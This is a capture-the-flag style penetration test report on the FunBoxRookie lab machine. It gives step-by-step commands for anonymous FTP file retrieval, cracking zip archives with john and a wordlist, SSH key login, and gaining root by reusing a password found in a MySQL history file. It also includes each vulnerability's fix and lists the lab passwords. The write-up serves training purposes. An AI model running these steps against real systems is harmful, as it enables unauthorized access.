# Penetration Test Report for Proving Grounds - FunBoxRookie
**Author:** Joey Melo
**Date:** March 18, 2022
**Client:** Proving Grounds
**Host:** 192.168.189.107 (FunBoxRookie)

## Disclaimer
The following report is the solution of a challenge in a learning platform that has no association whatsoever with the author. Please consider this report as a rough simulation of what a real pentesting report looks like. Attempting to use the methodologies demonstrated in this report in unauthorized clients is ILLEGAL. The author is not responsible for improper use or unauthorized modifications of this information. The author assumes no liability for the use of information disclosed in this report. Any damage or loss that may result from improper use of the information contained in this report is the sole responsibility of the user and not the author. The author recommends safe practices and an ethical standpoint when working with clients and or with tools demonstrated in this report.

## Introduction
This penetration test report contains all efforts that were conducted in order to assess the security of Proving Grounds. This report contains all items that were used to penetrate and gain privileged access to the remote host(s). The purpose of this report is to showcase that the tester has a full understanding of penetration testing methodologies as well as the technical knowledge to perform professional cybersecurity assessments.

## Objectives
The objective of this assessment is to perform an internal penetration test against the FunBoxRookie network. The tester is tasked with following methodical approach in obtaining access to the objective goals. This test should simulate an actual penetration test and how one would start from beginning to end, including the overall report.

## Executive Summary
The tester was tasked with performing an internal penetration test towards the FunBoxRookie network. An internal penetration test is a dedicated attack against internally connected systems. The focus of this test is to perform attacks, similar to those of a hacker and attempt to infiltrate Proving Grounds's internal lab systems. The tester's overall objective was to evaluate the network, identify systems, and exploit flaws while reporting the findings back to Proving Grounds.
When performing the internal penetration test, there were several alarming vulnerabilities that were identified on the FunBoxRookie network. When performing the attacks, the tester was able to gain access to the machine, primarily due to FTP misconfigurations and weak password policy. The host has been sucessfully exploited, and privileged access was gained in the machine.

## Recommendations
The tester recommends patching the vulnerabilities identified during the testing to ensure that an attacker cannot exploit these systems in the future. One thing to remember is that these systems require frequent patching and, once patched, should remain on a regular patch program to protect additional vulnerabilities that are discovered at a later date.

# Assessment
## Service Enumeration
### Port Scan Results
**TCP:** 21, 22, 80
### FTP Enumeration
Upon manual enumeration of the available FTP service, the tester noticed it had anonymous access enabled which allowed the tester to read all files in the FTP folder.
The content comprised of multiple password-protected zip files and an encoded message from admin informing that these files contain ssh keys.
<ss1>

## Initial Access
### Vulnerability Explanation
The FTP server allows anonymous access to sensitive files. Although these files are encrypted with password protection, the passwords used are weak and can be guessed with a simple word list. 
### Vulnerability Fix
Disable anonymous access to the FTP server and enforce a stronger password policy in the files. The tester recommends changing the files passwords immediately.
### Attack Walkthrough
Initial access was obtained to the FTP server with anonymous credentials and all files were transfer to the tester's machine.
```bash
ftp anonymous@192.168.189.107
ftp> ls -la
ftp> mget *
ftp> get .@admins
ftp> get .@users
ftp> exit
```
The tester was able to decode the *.@admin* message and read its contents, which revealed that the zip files contain keys to the SSH server.
```bash
cat .@admins | base64 -d
```
<ss2>

Then, using a simple wordlist, two passwords were cracked, which granted access to the SSH server. The tester decided to connect to the *tom* user.
```bash
for f in `ls .zip`; do zip2john $f >> hashes.txt; done
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
unzip tom.zip # pwd=iubire
ssh -i id_rsa tom@192.168.189.107 
```
<ss3>

As proof of exploitation, the tester captured the *local.txt* flag.
<user-flag>

## Privilege Escalation
### Vulnerability Explanation
After establishing a foothold on the tagert, the tester noticed that the compromised user (*tom*) was a member of the *sudo* group, which allows him to execute commands with high privileges.
The tester also notice a *.mysql_history* file in the user's home directory, which contained a password. 
### Vulnerability Fix
Unless the *tom* user needs to execute privileged commands, remove him from the *sudo* group or limit its access to only specific applications. Morever, the tester recommends either not storing plaintext passwords in history files or backing up and cleaning these files frequently to avoid leaking sensitive information.
### Attack Walkthrough
A simple user and directory enumeration revealed that *tom* is a member of the *sudo* group, and his home directory contains the *.mysql_history* file.
```bash
id
ls -la
```
<ss4>

The tester then successfully reused the captured password to execute high-privileged commands and obtain a *root* shell.
```bash
sudo su
```
<root-flag>

## Post-Exploitation
As proof of post-exploitation, the tester captured the *proof.txt* flag.

# Appendix A: Commands Issued
```bash
# Enumeration
sudo nmap -sC -sV -oN tcp_ports.nmap -p- 192.168.189.107

# Get FTP files
ftp anonymous@192.168.189.107 # blank password
ftp> ls -la
ftp> mget *
ftp> get .@admins
ftp> get .@users
ftp> exit
cat .@admins | base64 -d

# Crack zip files
for f in `ls .zip`; do zip2john $f >> hashes.txt; done
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
unzip tom.zip # pwd=iubire

# Initial access
ssh -i id_rsa tom@192.168.189.107 
pwd; id; cat local.txt; ifconfig

# Privilege escalation
ls -la
cat .mysql_history # pwd=xx11yy22!
sudo su
cd /root
pwd; id; cat proof.txt; ifconfig
```
